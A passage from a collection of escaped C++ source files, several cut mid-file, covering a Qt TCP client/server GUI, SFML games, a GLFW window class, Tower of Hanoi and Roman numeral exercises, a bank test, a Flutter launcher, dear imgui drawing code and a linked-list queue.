client->connectToServer(ui.lineEditClientIP->text(), ui.lineEditClientPort->text().toInt());\n            if (client->isConnected()) {\n                ui.pushButtonConnect->setText(tr(\"Disconnect\"));\n                message = QString(tr(\"[%1]# Connect %2:%3 surrces\\n\")).arg(date)\n\t\t\t\t\t.arg(ui.lineEditClientIP->text()).arg(ui.lineEditClientPort->text().toInt());\n                clientCnt++;\n            }\n            else {\n                message = QString(tr(\"[%1]# Connect %2:%3 failed\\n\")).arg(date)\n                    .arg(ui.lineEditClientIP->text()).arg(ui.lineEditClientPort->text().toInt());\n            }\n            ui.plainTextEditDataLogClient->appendPlainText(message);\n        }\n        else {\n\t\t\tclient->disconnectToServer();\n            if (!client->isConnected()) {\n                ui.pushButtonConnect->setText(tr(\"Connect\"));\n                message = QString(tr(\"[%1]# Disconnect %2:%3 surrces\\n\")).arg(date)\n                    .arg(ui.lineEditClientIP->text()).arg(ui.lineEditClientPort->text().toInt());\n                clientCnt++;\n            }\n            else {\n                message = QString(tr(\"[%1]# Disconnect %2:%3 failed\\n\")).arg(date)\n                    .arg(ui.lineEditClientIP->text()).arg(ui.lineEditClientPort->text().toInt());\n            }\n            ui.plainTextEditDataLogClient->appendPlainText(message);\n        }\n        });\n    \n    // \u65b0\u7684\u8fde\u63a5\n    connect(server, &BaseConversionServer::newConnect, this, [&](QTcpSocket* socket) {\n        QString date = QDateTime::currentDateTime().toString(\"yyyy-MM-dd hh:mm:ss.zzz\");\n        if (socket) {\n            // \u83b7\u53d6\u5ba2\u6237\u7aef\u7684 IP \u5730\u5740\u548c\u7aef\u53e3\n            QHostAddress clientAddress = socket->peerAddress();\n            quint16 clientPort = socket->peerPort();\n            message = QString(tr(\"[%1] client %2:%3 join.\\n\")).arg(date)\n                .arg(clientAddres",
    "#include <iostream>\r\n#include <SFML/Graphics.hpp>\r\n#include <SFML/Audio.hpp>\r\nusing namespace std;\r\n\r\n/* \r\nRayaan Raza - 23I0535\r\n\r\n\r\nPromts used \r\n    -How to add custom font\r\n    -How to calculate grid position of bullet\r\n    -How to move an object using SF clock\r\n    -How to create a message on the screen and take user input\r\n    -How to add different Textures for different states*/\r\n\r\n\r\n\r\n// Initializing Dimensions.\r\n\r\n// resolutionX and resolutionY determine the rendering resolution.\r\n\r\n// Don't edit unless required. Use functions on lines 43, 44, 45 for resizing the game window.\r\n\r\nconst int resolutionX = 960;\r\n\r\nconst int resolutionY = 960;\r\n\r\nconst int boxPixelsX = 32;\r\n\r\nconst int boxPixelsY = 32;\r\n\r\nconst int gameRows = resolutionX / boxPixelsX; // Total rows on grid\r\n\r\nconst int gameColumns = resolutionY / boxPixelsY; // Total columns on grid\r\n\r\n\r\n\r\n// Initializing GameGrid.\r\n\r\nint gameGrid[gameRows][gameColumns] = {};\r\n\r\n\r\n\r\n// The following exist purely for readability.\r\n\r\nconst int x = 0;\r\n\r\nconst int y = 1;\r\n\r\nconst int exists = 2;\r\n\r\n\r\n\r\n/////////////////////////////////////////////////////////////////////////////\r\n\r\n//                                                                         //\r\n\r\n// Write your functions declarations here. Some have been written for you. //\r\n\r\n//                                                                         //\r\n\r\n/////////////////////////////////////////////////////////////////////////////\r\n\r\n\r\n\r\nvoid drawPlayer(sf::RenderWindow& window, float player[], sf::Sprite& playerSprite, sf::Event& event, float bullet[3], int& maxbullet,sf::Clock& bulletClock);\r\n\r\nvoid moveBullet(float bullet[], sf::Clock& bulletClock, float player[]);\r\n\r\nvoid drawBullet(sf::RenderWindow& window, float bullet[], sf::Sprite& bulletSprite);\r\n\r\nvoid initializeCentipede(int centipede[][4], int&centipedeLength, int& direction);\r\n\r\nvoid drawCentipede(sf::RenderWindow& window, int centipede[][4], sf::Sprite& centipedeSprite, int& centipedeLength,sf::Texture& headTexture,sf::Texture& centipedeTexture, int& direction,int& hitIndex);\r\n\r\nvoid moveCentipede(int centipede[][4], int& centipedeLength, int& direction, sf::Clock& centipedeClock, int mushrooms[][4], int& maxMushrooms,float& fact,int& collisionCount);\r\n\r\nvoid splitCentipede(sf::Texture& headTexture, int& centipedeLength, int centipede[][4], float bullet[], int& direction, int& score, sf::Sprite& centipedeSprite,int& hitIndex);\r\n\r\nvoid drawMushrooms(sf::RenderWindow& window, int mushrooms[][4], const int maxMushrooms, sf::Texture mushroomTextures[], sf::Sprite& mushroomSprite, float bullet[3], int & score);\r\n\r\nvoid initializeMushroom(int index, int mushrooms[][4], int gameGrid[][gameColumns], int & health, int & maxMushrooms);\r\n\r\nvoid checkBulletMushroomCollision(float bullet[3], int& maxbullet, int mushrooms[][4], int& maxMushrooms, int poisonMushrooms[][4], int& maxPoisonMushrooms, int gameGrid[][gameColumns], int& score);\r\n\r\nbool allSegmentsDestroyed(int centipede[][4], int& centipedeLength, int small[][4]);\r\n\r\nvoid initializePoisonMushrooms(int poisonMushrooms[][4], const int maxPoisonMushrooms,int& health);\r\n\r\nvoid createPoisonMushroom(int poisonMushrooms[][4], int centipede[][4], float bullet[], const int maxPoisonMushrooms,int& centipedeLength);\r\n\r\nvoid drawPoisonMushrooms(sf::RenderWindow& window, int poisonMushrooms[][4], int& maxPoisonMushrooms, sf::Texture poisonMushroomTextures[], sf::Sprite& poisonMushroomSprite);\r\n\r\nvoid checkPlayerCollision(float player[],int centipede[][4], int& centipedeLength, int& lives,int poisonMushrooms[][4],int& maxPoisonMushrooms, sf::RenderWindow& window,sf::Font& font,int small[][4]);\r\n\r\nvoid drawSmall(sf::RenderWindow& window, int small[][4], sf::Sprite& smallSprite, sf::Texture& smallTexture, int&smalldir);\r\n\r\nvoid moveSmall(int small[][4], sf::Clock& smallClock, int& smalldir, int mushrooms[][4], int& maxMushrooms,int poisonMushrooms[][4], int& maxPoisonMushrooms);\r\n\r\nvoid initializesmall(int small[2][4],int& smalldir);\r\n\r\nbool isCentipedeInBottomRows(int centipede[][4], int& centipedeLength);\r\n\r\nvoid checkBulletSmallCollision(float bullet[], int& maxBullet, int small[][4],int& score);\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nint main()\r\n\r\n{\r\n\r\n\tsrand(time(0));\r\n\r\n\r\n\r\n\t// Declaring RenderWindow.\r\n\r\n\tsf::RenderWindow window(sf::VideoMode(resolutionX, resolutionY), \"Centipede\", sf::Style::Close | sf::Style::Titlebar);\r\n\r\n\r\n\r\n\t// Used to resize your window if it's too big or too small. Use according to your needs.\r\n\r\n\twindow.setSize(sf::Vector2u(640, 640)); // Recommended for 1366x768 (768p) displays.\r\n\r\n\t// window.setSize(sf::Vector2u(1280, 1280)); // Recommended for 2560x1440 (1440p) displays.\r\n\r\n\t// window.setSize(sf::Vector2u(1920, 1920)); // Recommended for 3840x2160 (4k) displays.\r\n\r\n\t\r\n\r\n\t// Used to position your window on every launch. Use according to your needs.\r\n\r\n\twindow.setPosition(sf::Vector2i(100, 0));\r\n\r\n\r\n\r\n\t// Initializing Background Music.\r\n\r\n\tsf::Music bgMusic;\r\n\r\n\tbgMusic.openFromFile(\"Musi",
    "#include \"fzpch.h\"\n#include \"WindowsWindow.h\"\n\n#include \"Fuze/Core/Event/Event.h\"\n#include \"Fuze/Core/Event/WindowEvent.h\"\n\n#define GLFW_INCLUDE_NONE\n#include <GLFW/glfw3.h>\n\nnamespace Fuze {\n\t\n\tstatic uint32_t s_NumWindowsCreated = 0;\n\n\tstatic void GLFWErrorCallback(int code, const char* description)\n\t{\n\t\tFZ_CORE_ERROR_TAG(\"GLFW\", \"GLFW Error! code={0}, Description={1}\", code, description);\n\t}\n\n\tWindowsWindow::WindowsWindow(const WindowProperties& properties)\n\t{\n\t\tm_Window = nullptr;\n\n\t\tm_Data.Title = properties.Title;\n\t\tm_Data.PosX = 0;\n\t\tm_Data.PosY = 0;\n\t\tm_Data.Width = properties.Width;\n\t\tm_Data.Height = properties.Height;\n\t\tm_Data.State = properties.State;\n\t\tm_Data.VSync = properties.VSync;\n\t\tm_Data.Decorated = properties.Decorated;\n\t\tm_Data.Floating = properties.Decorated;\n\n\t\tm_Data.EventCallback = nullptr;\n\n\t\tInit();\n\t}\n\n\tWindowsWindow::~WindowsWindow()\n\t{\n\t\tShutdown();\n\t}\n\n\tvoid WindowsWindow::Init()\n\t{\n\t\tif (s_NumWindowsCreated == 0)\n\t\t{\n\t\t\tconst int success = glfwInit();\n\t\t\tFZ_CORE_VERIFY(success, \"Could not initialize GLFW!\");\n\t\t\tglfwSetErrorCallback(GLFWErrorCallback);\n\t\t}\n\n\t\t{\n\n//#if defined(FZ_DEBUG)\n//\t\t\tif (Renderer::GetAPI() == GPU::GraphicsAPI::API::OpenGL)\n//\t\t\t\tglfwWindowHint(GLFW_OPENGL_DEBUG_CONTEXT, GLFW_TRUE);\n//#endif\n\n\t\t\tglfwWindowHint(GLFW_DECORATED, m_Data.Decorated ? GLFW_TRUE : GLFW_FALSE);\n\t\t\tglfwWindowHint(GLFW_FLOATING, m_Data.Floating ? GLFW_TRUE : GLFW_FALSE);\n\n\t\t\tm_Window = glfwCreateWindow((int)m_Data.Width, (int)m_Data.Height, m_Data.Title.c_str(), nullptr, nullptr);\n\t\t\t++s_NumWindowsCreated;\n\t\t}\n\n\t\tglfwSetWindowUserPointer(m_Window, &m_Data);\n\n\t\tSetVSync(m_Data.VSync);\n\t\tSetResizable(m_Data.Resizable);\n\t\tSetState(m_Data.State);\n\n\t\t// Set GLFW callbacks\n#pragma region Callbacks\n\t\tglfwSetWindowSizeCallback(m_Window, [](GLFWwindow* window, int width, int height)\n\t\t{\n\t\t\tWindowData& data = *(WindowData*)glfwGetWindowUserPointer(window);\n\t\t\tdata.Width = width;\n\t\t\tdata.Height = height;\n\n\t\t\tWindowResizeEvent event(width, height);\n\t\t\tdata.EventCallback(event);\n\t\t});\n\n\t\tglfwSetWindowPosCallback(m_Window, [](GLFWwindow* window, int xpos, int ypos)\n\t\t{\n\t\t\tWindowData& data = *(WindowData*)glfwGetWindowUserPointer(window);\n\t\t\tdata.PosX = xpos;\n\t\t\tdata.PosY = ypos;\n\n\t\t\tWindowMoveEvent event(xpos, ypos);\n\t\t\tdata.EventCallback(event);\n\t\t});\n\n\t\tglfwSetWindowFocusCallback(m_Window, [](GLFWwindow* window, int focused)\n\t\t{\n\t\t\tconst WindowData& data = *static_cast<WindowData*>(glfwGetWindowUserPointer(window));\n\t\t\tswitch (focused)\n\t\t\t{\n\t\t\t\tcase GLFW_TRUE:\n\t\t\t\t{\n\t\t\t\t\tWindowFocusEvent event(true);\n\t\t\t\t\tdata.EventCallback(event);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tcase GLFW_FALSE:\n\t\t\t\t{\n\t\t\t\t\tWindowFocusEvent event(false);\n\t\t\t\t\tdata.EventCallback(event);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tdefault: break;\n\t\t\t}\n\t\t});\n\n\t\tglfwSetWindowCloseCallback(m_Window, [](GLFWwindow* window)\n\t\t{\n\t\t\tconst WindowData& data = *static_cast<WindowData*>(glfwGetWindowUserPointer(window));\n\t\t\tWindowCloseEvent event;\n\t\t\tdata.EventCallback(event);\n\t\t});\n#pragma endregion\n\t}\n\n\tvoid WindowsWindow::Shutdown() const\n\t{\n\t\tglfwDestroyWindow(m_Window);\n\t\t--s_NumWindowsCreated;\n\n\t\tif (s_NumWindowsCreated <= 0)\n\t\t{\n\t\t\tglfwTerminate();\n\t\t}\n\t}\n\n\tvoid WindowsWindow::OnUpdate()\n\t{\n\t\tglfwPollEvents();\n\t}\n\n\tvoid WindowsWindow::SetPosition(uint32_t x, uint32_t y)\n\t{\n\t\tm_Data.PosX = x;\n\t\tm_Data.PosY = y;\n\t\tglfwSetWindowPos(m_Window, (int)x, (int)y);\n\t}\n\n\tvoid WindowsWindow::SetTitle(const std::string& title)\n\t{\n\t\tm_Data.Title = title;\n\t\tglfwSetWindowTitle(m_Window, title.c_str());\n\t}\n\n\tconst std::string& WindowsWindow::GetTitle() const\n\t{\n\t\treturn m_Data.Title;\n\t}\n\n\tvoid WindowsWindow::RequestAttention() const\n\t{\n\t\tglfwRequestWindowAttention(m_Window);\n\t}\n\n\tvoid WindowsWindow::SetState(WindowState state)\n\t{\n\t\tm_Data.State = state;\n\t}\n\n\tFuze::WindowState WindowsWindow::GetState() const\n\t{\n\t\treturn m_Data.State;\n\t}\n\n\tvoid WindowsWindow::SetDecorated(bool decorated)\n\t{\n\t\tm_Data.Decorated = decorated;\n\t\tglfwSetWindowAttrib(m_Window, GLFW_DECORATED, decorated ? GLFW_TRUE : GLFW_FALSE);\n\t}\n\n\tbool WindowsWindow::IsDecorated() const\n\t{\n\t\treturn m_Data.Decorated;\n\t}\n\n\tvoid WindowsWindow::SetFloating(bool floating)\n\t{\n\t\tm_Data.Floating = floating;\n\t\tglfwSetWindowAttrib(m_Window, GLFW_FLOATING, floating ? GLFW_TRUE : GLFW_FALSE);\n\t}\n\n\tbool WindowsWindow::IsFloating() const\n\t{\n\t\treturn m_Data.Floating;\n\t}\n\n\tvoid WindowsWindow::SetVSync(bool enabled)\n\t{\n\t\tif (enabled)\n\t\t\tglfwSwapInterval(1);\n\t\telse\n\t\t\tglfwSwapInterval(0);\n\n\t\tm_Data.VSync = enabled;\n\t}\n\n\tvoid WindowsWindow::SetResizable(bool resizable)\n\t{\n\t\tglfwSetWindowAttrib(m_Window, GLFW_RESIZABLE, resizable ? GLFW_TRUE : GLFW_FALSE);\n\t\tm_Data.Resizable = resizable;\n\t}\n\n\tbool WindowsWindow::IsVSync() const\n\t{\n\t\treturn m_Data.VSync;\n\t}\n\n\tbool WindowsWindow::IsResizable() const\n\t{\n\t\treturn m_Data.Resizable;\n\t}\n}\n",
    "#include <iostream>\n#include <vector>\nusing namespace std;\n//three towers given, A,B,C\n//rule is that the larger disk cannot be on top of the smaller disk\n//candidate - smallest disk that wasn't moved on the previous move\n//find the candidate, move the candidate to the first available pos ( b or c)\n//if not finished, goto step 1\n\n\nint main() {\n    vector<int> t[3]; //three towers A,B,C represented as an array of vectors\n    int n;\n    cout << \"Please enter the number of rings to move: \";\n    cin >> n;\n    cout << endl;\n    int from = 0, to = 0, move = 0, candidate = 1;\n\n    //initializing the three towers\n    for (int i = n + 1; i >= 1; i--) {\n        t[0].push_back(i);\n    }\n    t[1].push_back(n + 1);\n    t[2].push_back(n + 1);\n\n    if(n % 2 == 1) {\n        to = 1;\n\n        while (t[1].size() < n + 1) { //running as long as a tower contains all the rings\n            cout << \"Move #\" << ++move << \": Transfer ring \" << candidate << \" from tower \" << char(from + 'A')\n                 << \" to tower \" << char(to + 'A') << \"\\n\";\n\n            //Move the ring from the \"from tower\" to the \"to tower\"\n            t[to].push_back(t[from].back());\n            t[from].pop_back();\n\n            // Update 'from' tower\n            if (t[(to + 1) % 3].back() <\n                t[(to + 2) % 3].back()) { //comparison of size of disk, if one is smaller, that is new candidate\n                from = (to + 1) % 3; // after new candidate is chosen, it will move one to right of 'from' tower\n            } else {\n                from = (to + 2) % 3; // else, move to two to right of 'from' tower\n            }\n\n            //update candidate\n            candidate = t[from].back();\n\n            //update 'to' tower\n            if (t[from].back() <\n                t[(from + 1) % 3].back()) {///comparison of size of disk, if one is smaller, that is new candidate\n                to = (from + 1) % 3; // Move to the tower after 'from'\n            } else {\n                to = (from + 2) % 3; // Move to the tower two positions after 'from'\n            }\n        }\n    }\n    if(n%2 == 0){\n        to = 2;\n        while (t[1].size() < n + 1) { // while t[1] does not contain all the rings\n            cout << \"Move #\" << ++move << \": Transfer ring \" << candidate << \" from tower \" << char(from+'A') << \" to tower \" << char(to+'A') << \"\\n\";\n\n            // Move the ring from the \"from tower\" to the \"to tower\" (first copy it, then delete it from the \"from tower\")\n            t[to].push_back(t[from].back());\n            t[from].pop_back();\n\n            // from = the index of the tower with the smallest ring that has not just been moved: (to+1)%3 or (to+2)%3\n            if (t[(to + 2) % 3].back() < t[(to + 1) % 3].back())\n                from = (to + 2) % 3;\n            else\n                from = (to + 1) % 3;\n\n            // candidate = the ring on top of the t[from] tower\n            candidate = t[from].back();\n\n            // to = the index of the closest tower on which the candidate can be placed: (from+1)%3 or (from+2)%3\n            // (compare the candidate with the ring on the closer tower; which tower is \"closer\" depends on whether n is odd or even)\n            if (t[(from + 2) % 3].back() < t[from].back())\n                to = (from + 1) % 3;\n            else\n                to = (from + 2) % 3;\n        }\n    }\n    return 0;\n}\n",
    "#include<iostream>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n    // Prompt the user to enter a Roman numeral\r\n    string n;\r\n    cout << \"Enter a Roman numeral: \";\r\n    cin >> n; // Read the user input\r\n\r\n    // Determine the length of the string\r\n    int size = n.length();\r\n    int i = 0, sum = 0; // Initialize index and sum\r\n\r\n    // Process each character in the string\r\n    while(size != 0)\r\n    {\r\n        if (n[i] == 'I')\r\n        {\r\n            // Check for IV (4) and IX (9) cases\r\n            if (n[i + 1] == 'V')\r\n            {\r\n                sum += 4;\r\n                size -= 2;\r\n                i += 2;\r\n                continue; // Move to the next iteration of the loop\r\n            }\r\n            else if (n[i + 1] == 'X')\r\n            {\r\n                sum += 9;\r\n                size -= 2;\r\n                i += 2;\r\n                continue; // Move to the next iteration of the loop\r\n            }\r\n            else\r\n            {\r\n                sum += 1;\r\n            }\r\n        }\r\n        else if (n[i] == 'V')\r\n        {\r\n            sum += 5;\r\n        }\r\n        else if (n[i] == 'X')\r\n        {\r\n            // Check for XL (40) and XC (90) cases\r\n            if (n[i + 1] == 'L')\r\n            {\r\n                sum += 40;\r\n                size -= 2;\r\n                i += 2;\r\n                continue; // Move to the next iteration of the loop\r\n            }\r\n            else if (n[i + 1] == 'C')\r\n            {\r\n                sum += 90;\r\n                size -= 2;\r\n                i += 2;\r\n                continue; // Move to the next iteration of the loop\r\n            }\r\n            else\r\n            {\r\n                sum += 10;\r\n            }\r\n        }\r\n        else if (n[i] == 'L')\r\n        {\r\n            sum += 50;\r\n        }\r\n        else if (n[i] == 'C')\r\n        {\r\n            // Check for CD (400) and CM (900) cases\r\n            if (n[i + 1] == 'D')\r\n            {\r\n                sum += 400;\r\n                size -= 2;\r\n                i += 2;\r\n                continue; // Move to the next iteration of the loop\r\n            }\r\n            else if (n[i + 1] == 'M')\r\n            {\r\n                sum += 900;\r\n                size -= 2;\r\n                i += 2;\r\n                continue; // Move to the next iteration of the loop\r\n            }\r\n            else\r\n            {\r\n                sum += 100;\r\n            }\r\n        }\r\n        else if (n[i] == 'D')\r\n        {\r\n            sum += 500;\r\n        }\r\n        else if (n[i] == 'M')\r\n        {\r\n            sum += 1000;\r\n        }\r\n        i++; // Move to the next character\r\n        size--; // Decrease the size\r\n    }\r\n\r\n    // Output the calculated sum\r\n    cout << sum << endl;\r\n\r\n    return 0;\r\n}",
    "#include <iostream>\n\n#include \"Bank.hpp\"\n\nint main() {\n    try {\n        Bank bank;\n        bank.addLiquidity(999);\n\n        if (bank.createAccount(0, 100)) {\n            std::cout << \"Account 0 created.\\n\";\n        } else {\n            throw std::runtime_error(\"Failed to create Account 0\");\n        }\n\n        if (bank.createAccount(1, 100)) {\n            std::cout << \"Account 1 created.\\n\";\n        } else {\n            throw std::runtime_error(\"Failed to create Account 1\");\n        }\n\n        std::cout << \"Bank state:\\n\" << bank << \"\\n\";\n\n        if (bank.giveLoan(0, 200)) {\n            std::cout << \"Loan given to Account 0\\n\";\n        } else {\n            throw std::runtime_error(\"Failed to give loan to Account 0\");\n        }\n        std::cout << \"After giving loan to Account 0:\\n\" << bank << \"\\n\";\n\n        if (bank.addFundsToAccount(1, 50)) {\n            std::cout << \"Funds added to Account 1\\n\";\n        } else {\n            throw std::runtime_error(\"Failed to add funds to Account 1\");\n        }\n        std::cout << \"After adding funds to Account 1:\\n\" << bank << \"\\n\";\n\n        std::cout << \"Accessing Account 0: \" << bank[0] << \"\\n\";\n        std::cout << \"Accessing Account 1: \" << bank[1] << \"\\n\";\n\n        if (bank.deleteAccount(0)) {\n            std::cout << \"Account 0 deleted\\n\";\n        } else {\n            throw std::runtime_error(\"Failed to delete Account 0\");\n        }\n        std::cout << \"After deleting Account 0:\\n\" << bank << \"\\n\";\n    } catch (const std::exception& e) {\n        std::cerr << \"Error: \" << e.what() << \"\\n\";\n    }\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_restaurante_1\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <SFML/Graphics.hpp>\n#include <iostream>\n\nint main() \n{\n\n\tsf::RenderWindow window(sf::VideoMode(800, 600), \"RPG-Game\");\n\n\tsf::Texture playerTexture;\n\tsf::Sprite playerSprite;\n\n\tif (playerTexture.loadFromFile(\"Assets/PLayer/Textures/spritesheet.png\"))\n\t{\n\t\tstd::cout << \"PLayer Images Loaded!\\n\";\n\t\tplayerSprite.setTexture(playerTexture);\n\n\n\t\tint XIndex = 0;\n\t\tint YIndex = 0;\n\n\t\tplayerSprite.setTextureRect(sf::IntRect(XIndex * 64, YIndex * 64, 64, 64));\n\t\tplayerSprite.setScale(sf::Vector2f(3, 3));\n\t}\n\telse\n\t{\n\t\tstd::cout << \"Load texture failed!\\n\";\n\t\treturn 0;\n\t}\n\n\n\twhile (window.isOpen())\n\t{\n\t\tsf::Event event;\n\t\twhile (window.pollEvent(event))\n\t\t{\n\t\t\tif (event.type == sf::Event::Closed) window.close();\n\n\t\t}\n\n\t\tif(sf::Keyboard::isKeyPressed(sf::Keyboard::W)) playerSprite.move(sf::Vector2f(0 ,-0.1));\n\n\t\tif (sf::Keyboard::isKeyPressed(sf::Keyboard::A)) playerSprite.move(sf::Vector2f(-0.1, 0));\n\n\t\tif (sf::Keyboard::isKeyPressed(sf::Keyboard::S)) playerSprite.move(sf::Vector2f(0, 0.1));\n\n\t\tif (sf::Keyboard::isKeyPressed(sf::Keyboard::D)) playerSprite.move(sf::Vector2f(0.1, 0));\n\n\t\twindow.clear();\n\n\t\twindow.draw(playerSprite);\n\n\t\twindow.display();\n\t\t\n\t}\n\n\n\treturn 1;\n}",
    "// dear imgui, v1.88 WIP\n// (drawing and font code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] STB libraries implementation\n// [SECTION] Style functions\n// [SECTION] ImDrawList\n// [SECTION] ImDrawListSplitter\n// [SECTION] ImDrawData\n// [SECTION] Helpers ShadeVertsXXX functions\n// [SECTION] ImFontConfig\n// [SECTION] ImFontAtlas\n// [SECTION] ImFontAtlas glyph ranges helpers\n// [SECTION] ImFontGlyphRangesBuilder\n// [SECTION] ImFont\n// [SECTION] ImGui Internal Render Helpers\n// [SECTION] Decompression code\n// [SECTION] Default font data (ProggyClean.ttf)\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n\n#ifndef IMGUI_DEFINE_MATH_OPERATORS\n#define IMGUI_DEFINE_MATH_OPERATORS\n#endif\n\n#include \"imgui_internal.h\"\n#ifdef IMGUI_ENABLE_FREETYPE\n#include \"misc/freetype/imgui_freetype.h\"\n#endif\n\n#include <stdio.h>      // vsnprintf, sscanf, printf\n#if !defined(alloca)\n#if defined(__GLIBC__) || defined(__sun) || defined(__APPLE__) || defined(__NEWLIB__)\n#include <alloca.h>     // alloca (glibc uses <alloca.h>. Note that Cygwin may have _WIN32 defined, so the order matters here)\n#elif defined(_WIN32)\n#include <malloc.h>     // alloca\n#if !defined(alloca)\n#define alloca _alloca  // for clang with MS Codegen\n#endif\n#else\n#include <stdlib.h>     // alloca\n#endif\n#endif\n\n// Visual Studio warnings\n#ifdef _MSC_VER\n#pragma warning (disable: 4127)     // condition expression is constant\n#pragma warning (disable: 4505)     // unreferenced local function has been removed (stb stuff)\n#pragma warning (disable: 4996)     // 'This function or variable may be unsafe': strcpy, strdup, sprintf, vsnprintf, sscanf, fopen\n#pragma warning (disable: 6255)     // [Static Analyzer] _alloca indicates failure by raising a stack overflow exception.  Consider using _malloca instead.\n#pragma warning (disable: 26451)    // [Static Analyzer] Arithmetic overflow : Using operator 'xxx' on a 4 byte value and then casting the result to a 8 byte value. Cast the value to the wider type before calling operator 'xxx' to avoid overflow(io.2).\n#pragma warning (disable: 26812)    // [Static Analyzer] The enum type 'xxx' is unscoped. Prefer 'enum class' over 'enum' (Enum.3). [MSVC Static Analyzer)\n#endif\n\n// Clang/GCC warnings with -Weverything\n#if defined(__clang__)\n#if __has_warning(\"-Wunknown-warning-option\")\n#pragma clang diagnostic ignored \"-Wunknown-warning-option\"         // warning: unknown warning group 'xxx'                      // not all warnings are known by all Clang versions and they tend to be rename-happy.. so ignoring warnings triggers new warnings on some configuration. Great!\n#endif\n#if __has_warning(\"-Walloca\")\n#pragma clang diagnostic ignored \"-Walloca\"                         // warning: use of function '__builtin_alloca' is discouraged\n#endif\n#pragma clang diagnostic ignored \"-Wunknown-pragmas\"                // warning: unknown warning group 'xxx'\n#pragma clang diagnostic ignored \"-Wold-style-cast\"                 // warning: use of old-style cast                            // yes, they are more terse.\n#pragma clang diagnostic ignored \"-Wfloat-equal\"                    // warning: comparing floating point with == or != is unsafe // storing and comparing against same constants ok.\n#pragma clang diagnostic ignored \"-Wglobal-constructors\"            // warning: declaration requires a global destructor         // similar to above, not sure what the exact difference is.\n#pragma clang diagnostic ignored \"-Wsign-conversion\"                // warning: implicit conversion changes signedness\n#pragma clang diagnostic ignored \"-Wzero-as-null-pointer-constant\"  // warning: zero as null pointer constant                    // some standard header variations use #define NULL 0\n#pragma clang diagnostic ignored \"-Wcomma\"                          // warning: possible misuse of comma operator here\n#pragma clang diagnostic ignored \"-Wreserved-id-macro\"              // warning: macro name is a reserved identifier\n#pragma clang diagnostic ignored \"-Wdouble-promotion\"               // warning: implicit conversion from 'float' to 'double' when passing argument to function  // using printf() is a misery with this as C++ va_arg ellipsis changes float to double.\n#pragma clang diagnostic ignored \"-Wimplicit-int-float-conversion\"  // warning: implicit conversion from 'xxx' to 'float' may lose precision\n#elif defined(__GNUC__)\n#pragma GCC diagnostic ignored \"-Wpragmas\"                  // warning: unknown option after '#pragma GCC diagnostic' kind\n#pragma GCC diagnostic ignored \"-Wunused-function\"          // warning: 'xxxx' defined but not used\n#pragma GCC diagnostic ignored \"-Wdouble-promotion\"         // warning: implicit conversion from 'float' to 'double' when passing argument to function\n#pragma GCC diagnostic ignored \"-Wconversion\"               // warning: conversion to 'xxxx' from 'xxxx' may alter its value\n#pragma GCC diagnostic ignored \"-Wstack-protector\"          // w",
    "#include \"main.h\"\r\n#include \"LinkListQueue.h\"\r\n\r\n\r\n//constructor\r\nLinkListQueue::LinkListQueue(){\r\n\tfrontNode = NULL;\r\n\tbackNode = NULL;\r\n}\r\n//enqueue implementation\r\nQueueNode* LinkListQueue::enQueue(QueueNode* node){\r\n\tif(frontNode == NULL){//Queue is empty\t\r\n\t\tnode->next = NULL;\r\n\t\tnode->prev = NULL;\r\n\t\tfrontNode = node;\r\n\t\tbackNode = node;\r\n\t} else {// add node to end of the queue\r\n\t\tnode->prev = NULL;\r\n\t\tnode->next = backNode;\r\n\t\tbackNode->prev = node;\r\n\t\tbackNode = node;\r\n\t}\r\n\treturn backNode;\r\n}\r\n\r\n//dequeue implementation\r\nQueueNode* LinkListQueue::deQueue(){\r\n\tQueueNode* node = NULL;\r\n\tif(frontNode == NULL){// Queue is empty\r\n\t\treturn NULL;\r\n\t} else {\r\n\t\tnode = frontNode;\r\n\t\tfrontNode = frontNode->prev;\r\n\t\tif(frontNode!=NULL) frontNode->next = NULL;\r\n\t}\r\n\treturn node;\r\n}\r\n\r\n//get first node in queue\r\nQueueNode* LinkListQueue::getFrontNode(){\r\n\treturn frontNode;\t\r\n}\r\n\r\n//get last node in queue\r\nQueueNode* LinkListQueue::getBackNode(){\r\n\treturn backNode;\r\n}\r\n\r\nQueueNode* LinkListQueue::removeNode(string strKey){\r\n    QueueNode* node = getNode(strKey);\r\n    QueueNode* prevNode = NULL;\r\n    QueueNode* nextNode = NULL;\r\n    \r\n    if(node == NULL) return NULL;\r\n    prevNode = node->prev;\r\n    nextNode = node->next;\r\n    if(prevNode != NULL) prevNode->next = node->next;\r\n    if(nextNode != NULL) nextNode->prev = node->prev;\r\n    \r\n    return node;\r\n}\r\n\r\nQueueNode* LinkListQueue::getNode(string strKey){\r\n    if(this->getBackNode() == NULL) return NULL; //return NULL if list is empty\r\n    \r\n    QueueNode* node = this->getBackNode();// Go to the back of the queue\r\n    \r\n    while(node != NULL){\r\n        if(node->key.compare(strKey) == 0 ) break;//end loop early when node is found\r\n        node = 